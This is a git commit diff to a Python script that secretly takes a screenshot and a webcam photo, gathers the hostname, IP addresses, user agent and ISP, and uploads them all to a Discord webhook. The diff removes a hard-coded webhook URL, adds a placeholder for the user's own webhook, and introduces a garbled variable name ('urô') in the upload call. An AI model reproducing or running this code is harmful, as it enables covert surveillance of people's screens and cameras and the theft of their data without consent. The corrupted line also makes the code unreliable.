0676f9a7b12e4695335ce6bc35115f2b36dcb30d
Asko7779 <169293034+Asko7779@users.noreply.github.com>
2025-02-12 20:42:48 +0100

    Update script.py

--- script.py
+++ script.py
@@ -7,15 +7,15 @@ import cv2
 import os
 from PIL import ImageGrab
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0'
+url = 'insert your own discord webhook url'
 
-def capture_screenshot():
+def ss():
     screenshot = ImageGrab.grab()
     screenshot_path = os.path.join(os.getcwd(), 'screenshot.png')
     screenshot.save(screenshot_path)
     return screenshot_path
 
-def capture_webcam_image():
+def webcam():
     cam = cv2.VideoCapture(0)
     ret, frame = cam.read()
     if ret:
@@ -44,7 +44,7 @@ def send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip
         "content": f"[+] Device Information:\n**[+] Hostname**: {hostname}\n**[+] Server IP**: {local_ip}\n**[+] User-Agent**: {user_agent}\n**[+] IPv4**: {public_ip}\n**[+] ISP**: {isp}"
     }
     try:
-        response = requests.post(WEBHOOK_URL, data=data, files=files)
+        response = requests.post(urô, data=data, files=files)
         if response.status_code == 204:
             print("Data sent successfully!")
         else:
@@ -57,8 +57,8 @@ def send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip
             os.remove(file.name)
 
 def main():
-    screenshot_path = capture_screenshot()
-    webcam_path = capture_webcam_image()
+    screenshot_path = ss()
+    webcam_path = webcam()
     hostname, local_ip, user_agent, public_ip, isp = d_info()
     send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp)
 
